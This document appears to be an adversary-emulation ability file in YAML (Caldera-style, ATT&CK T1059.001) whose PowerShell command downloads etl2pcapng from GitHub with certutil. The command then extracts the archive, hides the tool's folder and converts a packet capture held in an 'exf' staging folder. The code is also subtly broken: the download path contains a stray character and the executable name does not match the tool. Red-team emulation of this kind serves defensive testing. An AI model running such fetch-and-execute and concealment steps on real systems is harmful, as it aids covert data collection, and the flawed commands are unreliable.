- privilege: ''
  plugin: ''
  delete_payload: true
  technique_id: T1059.001
  additional_info:
    cleanup: '[]'
  technique_name: 'Command and Scripting Interpreter: PowerShell'
  repeatable: false
  tactic: execution
  requirements: []
  description: Downloads with certutil latest package of etl2pcapng, uncompress the
    archive  and convert etl capture to PCAPNG file
  executors:
  - platform: windows
    cleanup: []
    variations: []
    timeout: 60
    additional_info: {}
    name: psh
    payloads: []
    language: null
    uploads: []
    parsers: []
    code: null
    build_target: null
    command: "$etl_capture_file=\"$env:PUBLIC\\exf\\capture.etl\";\n$exf_file=\"$env:PUBLIC\\\
      exf\\capture.log\";\nif ([System.IO.File]::Exists($etl_capture_file)) {\ncertutil\
      \ -urlcache -f https://github.com/microsoft/etl2pcapng/releases/latest/download/etl2pcapng.zip\
      \ $env:PUBLIC:\xB7\\etl2pcapng.zip;\nAdd-Type -Assembly 'System.IO.Compression.FileSystem';\
      \ \n[System.IO.Compression.ZipFile]::ExtractToDirectory(\"$env:PUBLIC\\etl2pcapng.zip\"\
      ,\"$env:PUBLIC\");\n$psdir=Get-Item \"$env:PUBLIC\\etl2pcapng\" -Force;\n$psdir.attributes=\"\
      hidden\";\n$env:PUBLIC\\etl2pcapng\\etl2pcapng\\x86\\etl2etlpcapng.exe $env:PUBLIC\\\
      exf\\capture.etl $env:PUBLIC\\exf\\capture.pcap;  \n\texit 0;\n} \nelse {\n\
      \ Write-Host \"The file [$etl_capture_file] does not exists !!!\" >$exf_file;\n\
      \  exit 1;\n};"
  singleton: false
  buckets: []
  name: Download extract etl2pcapng to convert packet capture with certutil
  access: {}
  id: etl2pcap_download_and_use
